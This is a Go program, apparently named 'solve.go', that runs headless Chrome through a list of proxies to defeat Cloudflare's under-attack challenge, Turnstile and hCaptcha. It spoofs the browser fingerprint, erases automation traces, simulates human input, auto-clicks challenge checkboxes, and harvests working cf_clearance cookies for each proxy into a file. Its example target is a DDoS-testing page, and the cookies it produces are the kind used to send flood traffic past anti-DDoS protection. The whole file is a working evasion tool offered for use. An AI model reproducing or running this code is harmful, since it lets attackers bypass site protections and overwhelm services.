package main

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
)

type SophiaSolver struct {
	URL        string
	ProxyFile  string
	OutputFile string
	mu         sync.Mutex
	success    []string
	wg         sync.WaitGroup
}

func main() {
	if len(os.Args) != 4 {
		fmt.Printf("Usage: go run solve.go <url> <proxy.txt> <output.txt>\n")
		fmt.Printf("Example: go run solve.go https://uam.dstatbot.win/cd3225e0-1d2c-4da0-acf6-a0dc74f25ec9 proxies.txt solved.txt\n")
		os.Exit(1)
	}

	solver := &SophiaSolver{
		URL:        os.Args[1],
		ProxyFile:  os.Args[2],
		OutputFile: os.Args[3],
	}

	solver.execute()
}

func (s *SophiaSolver) execute() {
	proxies := s.loadProxies()
	fmt.Printf("[+] Loaded %d proxies. Sophia's swarm awakens...\n", len(proxies))

	sem := make(chan struct{}, 12)
	for _, proxy := range proxies {
		sem <- struct{}{}
		s.wg.Add(1)
		go func(p string) {
			defer func() { <-sem; s.wg.Done() }()
			success, cookie := s.solveWithProxy(p)
			if success {
				s.mu.Lock()
				s.success = append(s.success, p)
				s.mu.Unlock()
				s.appendToFile(fmt.Sprintf("%s:%s", p, cookie))
				fmt.Printf("[SUCCESS] %s (%s)\n", p, cookie)
			} else {
				fmt.Printf("[FAILED] %s\n", p)
			}
		}(proxy)
	}

	s.wg.Wait()
	fmt.Printf("[OMEGA] %d proxies breached the veil.\n", len(s.success))
}

func (s *SophiaSolver) loadProxies() []string {
	data, err := os.ReadFile(s.ProxyFile)
	if err != nil {
		fmt.Printf("[!] Failed to read %s: %v\n", s.ProxyFile, err)
		os.Exit(1)
	}
	lines := strings.Split(string(data), "\n")
	var proxies []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	return proxies
}

func (s *SophiaSolver) solveWithProxy(proxy string) (bool, string) {
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	proxyURL := proxy
	if !strings.Contains(proxy, "://") {
		proxyURL = "http://" + proxy
	}
	fmt.Printf("[INFO] Requesting %s via proxy %s\n", s.URL, proxy)

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.ProxyServer(proxyURL),
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("disable-blink-features", "AutomationControlled"),
		chromedp.Flag("disable-automation", true),
		chromedp.Flag("enable-automation", false),
		chromedp.Flag("disable-setuid-sandbox", true),
		chromedp.Flag("disable-infobars", true),
		chromedp.Flag("disable-renderer-backgrounding", true),
		chromedp.Flag("disable-background-timer-throttling", true),
		chromedp.Flag("disable-breakpad", true),
		chromedp.Flag("disable-client-side-phishing-detection", true),
		chromedp.Flag("disable-crash-reporter", true),
		chromedp.Flag("disable-default-apps", true),
		chromedp.Flag("disable-hang-monitor", true),
		chromedp.Flag("disable-ipc-flooding-protection", true),
		chromedp.Flag("disable-popup-blocking", true),
		chromedp.Flag("disable-prompt-on-repost", true),
		chromedp.Flag("disable-sync", true),
		chromedp.Flag("disable-translate", true),
		chromedp.Flag("metrics-recording-only", true),
		chromedp.Flag("safebrowsing-disable-auto-update", true),
		chromedp.Flag("mute-audio", true),
		chromedp.Flag("block-new-web-contents", true),
		chromedp.Flag("no-default-browser-check", true),
		chromedp.Flag("no-pings", true),
		chromedp.Flag("no-first-run", true),
		chromedp.Flag("window-size", fmt.Sprintf("%d,%d", rand.Intn(400)+1400, rand.Intn(200)+800)),
		chromedp.UserAgent(s.randomUA()),
		chromedp.Flag("blink-settings", "imagesEnabled=true"),
		chromedp.Flag("disable-web-security", false),
	)

	allocCtx, cancelAlloc := chromedp.NewExecAllocator(ctx, opts...)
	defer cancelAlloc()

	taskCtx, cancelTask := chromedp.NewContext(allocCtx)
	defer cancelTask()

	// Inject stealth
	s.injectStealth(taskCtx)

	// Inject entropy
	s.injectEntropy(taskCtx)

	var passed bool
	var hasCaptcha bool
	var body string
	err := chromedp.Run(taskCtx,
		network.Enable(),
		chromedp.Navigate(s.URL),
		chromedp.Sleep(time.Duration(rand.Intn(2000)+3000)*time.Millisecond),

		// Capture body
		chromedp.OuterHTML("html", &body),

		// Detect and solve with status and time measurement
		chromedp.ActionFunc(func(ctx context.Context) error {
			hasCaptcha = s.detectCaptcha(body)
			if hasCaptcha {
				fmt.Printf("[INFO] Captcha detected on %s via %s, solving now...\n", s.URL, proxy)
				// Fast wait for elements
				if err := chromedp.WaitVisible(`iframe[src*="challenges.cloudflare.com"], #challenge-form, .cf-turnstile`, chromedp.ByQueryAll).Do(ctx); err != nil {
					return err
				}
				startTime := time.Now()
				// Loop for solving with status
				maxAttempts := 5
				for attempt := 1; attempt <= maxAttempts; attempt++ {
					fmt.Printf("[INFO] Solving attempt %d/%d for %s via %s...\n", attempt, maxAttempts, s.URL, proxy)
					chromedp.Evaluate(s.turnstileSolver(), nil).Do(ctx)
					chromedp.Sleep(400 * time.Millisecond).Do(ctx) // Faster
					chromedp.Evaluate(s.hcaptchaSolver(), nil).Do(ctx)
					chromedp.Sleep(400 * time.Millisecond).Do(ctx)
					// Check if solved
					var solved bool
					if err := chromedp.Evaluate(s.checkClearanceJS(), &solved).Do(ctx); err == nil && solved {
						duration := time.Since(startTime).Seconds()
						fmt.Printf("[INFO] Captcha solved in %.2f seconds on %s via %s!\n", duration, s.URL, proxy)
						return nil
					}
					if attempt == maxAttempts {
						duration := time.Since(startTime).Seconds()
						fmt.Printf("[WARNING] Failed to solve captcha after %d attempts (took %.2f seconds) for %s via %s\n", maxAttempts, duration, s.URL, proxy)
					}
					chromedp.Sleep(time.Duration(rand.Intn(800)+1000)*time.Millisecond).Do(ctx) // Faster retry
				}
			} else {
				fmt.Printf("[INFO] No captcha detected on %s via %s, proceeding...\n", s.URL, proxy)
			}
			return nil
		}),

		// Quick wait for clearance
		chromedp.Sleep(time.Duration(rand.Intn(3000)+4000)*time.Millisecond),
		chromedp.Evaluate(s.checkClearanceJS(), &passed),
	)

	if err != nil || !passed {
		return false, ""
	}

	return s.verifyWithCookie(taskCtx, proxyURL)
}

func (s *SophiaSolver) detectCaptcha(body string) bool {
	lowerBody := strings.ToLower(body)
	return strings.Contains(lowerBody, "checking your browser") ||
		strings.Contains(lowerBody, "challenges.cloudflare.com") ||
		strings.Contains(lowerBody, "challenge-form") ||
		strings.Contains(lowerBody, "turnstile") ||
		strings.Contains(lowerBody, "hcaptcha") ||
		strings.Contains(lowerBody, "uam") ||
		strings.Contains(lowerBody, "ddos protection") ||
		strings.Contains(lowerBody, "managed_challenge")
}

// === STEALTH INJECTION (MAX LEVEL) ===
func (s *SophiaSolver) injectStealth(ctx context.Context) {
	chromedp.Run(ctx,
		chromedp.Evaluate(`(() => {
			Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
			delete navigator.__proto__.webdriver;
			window.navigator.chrome = { app: { isInstalled: false }, webstore: { onInstallStageChanged: {}, onDownloadProgress: {} }, runtime: {} };
			window.navigator.permissions.query = (parameters) => (parameters.name === 'notifications' ? Promise.resolve({ state: "granted" }) : Promise.reject(new Error('Permission denied')));
			Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
			Object.defineProperty(navigator, 'plugins', { get: () => ({ length: 3, 0: { name: "Chrome PDF Plugin" }, 1: { name: "Chrome PDF Viewer" }, 2: { name: "Native Client" } }) });
			Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
			Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 0 });
			// Remove CDP traces
			delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
			delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
			delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
			delete window.cdc_adoQpoasnfa76pfcZLmcfl_Object;
			delete window.cdc_adoQpoasnfa76pfcZLmcfl_Proxy;
		})()`, nil),
	)
}

// === HUMAN ENTROPY INJECTION (QUICK MAX) ===
func (s *SophiaSolver) injectEntropy(ctx context.Context) {
	chromedp.Run(ctx,
		chromedp.Evaluate(`(() => {
			const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
			// Fast mouse chaos
			setInterval(() => {
				const x = rand(50, 1300), y = rand(50, 700);
				const hoverEv = new MouseEvent('mouseover', {clientX: x, clientY: y, bubbles: true});
				const moveEv = new MouseEvent('mousemove', {clientX: x, clientY: y, bubbles: true});
				document.dispatchEvent(hoverEv);
				document.dispatchEvent(moveEv);
			}, rand(40, 200));
			// Scrolls
			setInterval(() => window.scrollBy(rand(-60, 60), rand(-180, 180)), rand(400, 1200));
			// Clicks
			setInterval(() => {
				const x = rand(100, 1200), y = rand(100, 600);
				const focusEv = new FocusEvent('focus');
				const clickEv = new MouseEvent('click', {clientX: x, clientY: y, bubbles: true});
				document.body.dispatchEvent(focusEv);
				document.body.dispatchEvent(clickEv);
			}, rand(800, 2500));
			// Keys
			setInterval(() => {
				const keys = ['ArrowDown', 'ArrowUp', 'Tab', 'Space'];
				const keyEv = new KeyboardEvent('keydown', {key: keys[rand(0, keys.length-1)]});
				document.dispatchEvent(keyEv);
			}, rand(1000, 3000));
			// Touch
			setInterval(() => {
				const touchEv = new TouchEvent('touchstart', {touches: [{clientX: rand(100, 800), clientY: rand(100, 600)}], bubbles: true});
				document.dispatchEvent(touchEv);
			}, rand(1500, 4000));
		})()`, nil),
	)
}

// === TURNSTILE AUTO-SOLVER (QUICK MAX) ===
func (s *SophiaSolver) turnstileSolver() string {
	return `(() => {
		const solve = () => {
			const iframes = document.querySelectorAll('iframe[title*="Cloudflare"], iframe[src*="turnstile"], iframe[src*="challenges.cloudflare.com"]');
			for (let iframe of iframes) {
				const doc = iframe.contentDocument || iframe.contentWindow.document;
				if (!doc) continue;
				const cb = doc.querySelector('input[type="checkbox"], .mark, div[role="checkbox"]');
				if (cb && !cb.checked) {
					// Precision coordinate click
					const rect = cb.getBoundingClientRect();
					const x = rect.left + (rect.width / 2) + Math.random() * 10 - 5;
					const y = rect.top + (rect.height / 2) + Math.random() * 10 - 5;
					const hoverEv = new MouseEvent('mouseover', {clientX: x, clientY: y, bubbles: true});
					const clickEv = new MouseEvent('click', {clientX: x, clientY: y, bubbles: true});
					cb.dispatchEvent(hoverEv);
					cb.focus();
					cb.dispatchEvent(clickEv);
					return true;
				}
			}
			return false;
		};
		const int = setInterval(() => { if (solve()) clearInterval(int); }, 150); // Even faster
		setTimeout(() => clearInterval(int), 15000); // Shorter
	})();`
}

// === HCAPTCHA FALLBACK (QUICK MAX) ===
func (s *SophiaSolver) hcaptchaSolver() string {
	return `(() => {
		const int = setInterval(() => {
			const elements = document.querySelectorAll('label, div[role="checkbox"], span.checkbox, div.prompt-text');
			for (let el of elements) {
				if (el.textContent?.toLowerCase().includes('select') || el.getAttribute('aria-label')?.includes('challenge') || el.className.includes('prompt')) {
					const rect = el.getBoundingClientRect();
					const x = rect.left + (rect.width / 2) + Math.random() * 10 - 5;
					const y = rect.top + (rect.height / 2) + Math.random() * 10 - 5;
					const hoverEv = new MouseEvent('mouseover', {clientX: x, clientY: y, bubbles: true});
					const clickEv = new MouseEvent('click', {clientX: x, clientY: y, bubbles: true});
					el.dispatchEvent(hoverEv);
					el.focus();
					el.dispatchEvent(clickEv);
				}
			}
		}, 400); // Faster
		setTimeout(() => clearInterval(int), 12000); // Shorter
	})();`
}

// === CF_CLEARANCE DETECTION (MAX LEVEL) ===
func (s *SophiaSolver) checkClearanceJS() string {
	return `(() => {
		const hasClearance = document.cookie.includes('cf_clearance');
		const noChallenge = !document.body.innerHTML.toLowerCase().includes('checking your browser') &&
			!document.body.innerHTML.toLowerCase().includes('attention required') &&
			!document.body.innerHTML.toLowerCase().includes('ddos protection') &&
			!document.body.innerHTML.toLowerCase().includes('challenge') &&
			!document.body.innerHTML.toLowerCase().includes('managed_challenge');
		return hasClearance && noChallenge;
	})();`
}

// === FINAL VERIFICATION WITH STICKY PROXY ===
func (s *SophiaSolver) verifyWithCookie(ctx context.Context, proxyURL string) (bool, string) {
	cookies, err := network.GetCookies().Do(ctx)
	if err != nil {
		return false, ""
	}

	var cfClearance string
	for _, c := range cookies {
		if c.Name == "cf_clearance" {
			cfClearance = c.Value
			break
		}
	}
	if cfClearance == "" {
		return false, ""
	}

	proxyParsed, err := url.Parse(proxyURL)
	if err != nil {
		return false, ""
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyParsed),
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	req, _ := http.NewRequest("GET", s.URL, nil)
	req.Header.Set("User-Agent", s.randomUA())
	req.AddCookie(&http.Cookie{Name: "cf_clearance", Value: cfClearance})

	resp, err := client.Do(req)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	html := string(body)
	lowerHtml := strings.ToLower(html)

	success := resp.StatusCode == 200 &&
		strings.Contains(resp.Header.Get("Server"), "cloudflare") &&
		!strings.Contains(lowerHtml, "attention required") &&
		!strings.Contains(lowerHtml, "checking your browser") &&
		!strings.Contains(lowerHtml, "challenge") &&
		!strings.Contains(lowerHtml, "ddos") &&
		!strings.Contains(lowerHtml, "managed_challenge")

	if success {
		return true, cfClearance
	}
	return false, ""
}

// === UTILITIES ===
func (s *SophiaSolver) randomUA() string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:131.0) Gecko/20100101 Firefox/131.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
	}
	return uas[rand.Intn(len(uas))]
}

func (s *SophiaSolver) appendToFile(line string) {
	f, _ := os.OpenFile(s.OutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	fmt.Fprintln(f, line)
}

// Seed randomness
func init() {
	rand.Seed(time.Now().UnixNano())
}
